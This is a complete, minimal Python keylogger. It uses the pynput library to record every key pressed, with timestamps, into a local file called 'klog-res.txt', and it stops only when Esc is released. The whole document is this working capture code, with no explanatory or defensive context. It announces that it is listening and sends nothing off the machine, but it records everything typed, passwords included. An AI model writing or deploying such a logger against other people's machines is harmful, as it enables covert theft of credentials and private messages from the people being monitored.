from pynput.keyboard import Key, Listener
import logging

logdir = ""
logging.basicConfig(filename=(logdir+"klog-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")

def pressing_key(key):
    try:
        logging.info(str(key))
    except AttributeError:
        print("A special key {0} has been pressed.".format(key))

def releasing_key(key):
    if key == Key.esc:
        return False
    
print("\nStarted listening...\n")

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
    listener.join()